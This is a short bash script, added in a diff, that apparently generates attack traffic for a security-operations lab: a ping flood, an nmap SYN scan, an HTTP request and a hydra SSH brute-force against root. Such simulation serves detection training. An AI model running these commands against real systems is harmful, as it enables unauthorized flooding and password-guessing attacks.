@@ -1,0 +1,32 @@
+#!/bin/bash
+# Filename: soc_lab_attacks.sh
+# Description: Combined script for ICMP, TCP SYN, HTTP, SSH brute-force
+# Usage: sudo bash soc_lab_attacks.sh <TARGET_IP>
+
+TARGET=$1
+
+if [ -z "$TARGET" ]; then
+  echo "Usage: sudo bash soc_lab_attacks.sh <TARGET_IP>"
+  exit 1
+fi
+
+echo "=== Starting SOC Lab Attack Simulation on $TARGET ==="
+
+# 1. ICMP Ping Flood
+echo "[*] ICMP Ping Flood..."
+ping -f -s 65000 -c 10 $TARGET
+
+# 2. TCP SYN Scan using Nmap
+echo "[*] TCP SYN Scan..."
+nmap -sS -Pn $TARGET
+
+# 3. HTTP GET Request
+echo "[*] Sending HTTP GET request..."
+curl -s http://$TARGET > /dev/null
+echo "  -> HTTP GET sent."
+
+# 4. SSH Brute-force with Hydra
+echo "[*] SSH Brute-force using Hydra (1 user, 5 passwords)..."
+hydra -l root -P passwords.txt ssh://$TARGET -t 4 -V -f
+
+echo "=== Attack Simulation Completed ==="
